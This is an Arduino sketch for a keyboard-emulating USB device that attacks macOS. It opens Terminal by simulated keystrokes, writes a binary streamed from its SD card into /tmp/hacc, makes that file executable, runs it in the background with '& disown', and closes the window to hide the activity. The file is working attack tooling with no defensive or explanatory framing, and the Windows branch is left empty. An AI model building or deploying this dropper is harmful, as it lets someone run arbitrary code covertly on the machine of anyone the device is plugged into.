#include<Keyboard.h> 
#include <Mouse.h> 
#include <SPI.h>
#include <SD.h>

// Assign a name to a file.
File myFile;

// Pin Declaration 
const int MacPin = 8;
const int WindowsPin = 9;
const int PhotoresistorPin = A0;
bool executed = false;

void setup() {

  Serial.begin(9600); // Open serial port

  // Declaring Input/Out Pins
  pinMode(10, INPUT);
  pinMode(MacPin, INPUT);
  pinMode(WindowsPin, INPUT);
  pinMode(4, OUTPUT);

  // Initializing SD Card
  if (!SD.begin(4)) {
    Serial.println("initialization failed!");
    while (1);
  }
  delay(1000);
}

void loop() {

  // Only if the MacPin is on AND it hasn't run once.
  if (digitalRead(MacPin) == HIGH && executed == false) {

    Mterminal("rm /tmp/hacc"); // Opens terminal. Then removes possible file.
    delay(1500);

    // USB Modem changed since Mouse.h was introduced.
    Keyboard.print("cat /dev/cu.usbmodemHIDFG1 > /tmp/hacc"); // Open serial between device and /tmp/hacc. 
    enter();

    while (!Serial);
    myFile = SD.open("roti"); // Choose which file to open. Can be altered if different program was added.

    // Writes all the contents in myFile to the serial.
    if (myFile) {
      while (myFile.available()) {  // While the file is available, write to the serial port.
        Serial.write(myFile.read());
      }
      myFile.close();// Closes the file:
    }

    twoKeys(KEY_LEFT_CTRL, 'c', 1000); // Stops the serial connection "manually".
    Keyboard.print("chmod +x /tmp/hacc"); // Makes it executable.
    enter();
    Keyboard.print("/tmp/hacc & disown"); // Opens the file.
    enter();
    twoKeys(KEY_LEFT_GUI, 'w', 1000); // Closes terminal.
    enter(); // Confirms to close terminal.

    executed = true;

  }

  // Only if the WindowsPin is on AND it hasn't run once.
  else if (digitalRead(WindowsPin) == HIGH && executed == false) {
    // Empty
    executed = true;
  }


  else if (digitalRead(MacPin) == LOW && digitalRead(WindowsPin) == LOW) {
    executed = false;
  }

}

// Functions

// Opening Terminal .
void Mterminal(char * input) {
  twoKeys(KEY_LEFT_GUI, ' ', 1000);
  Keyboard.print("terminal");
  enter();
  Keyboard.print(input);
  enter();
}

// Pressing Two Keys
void twoKeys(char key1, char key2, int postdelay) {
  delay(1000);
  Keyboard.press(key1);
  delay(100);
  Keyboard.press(key2);
  delay(100);
  Keyboard.releaseAll();
  delay(postdelay);
}

// Enter
void enter() {
  delay(300);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(300);

}
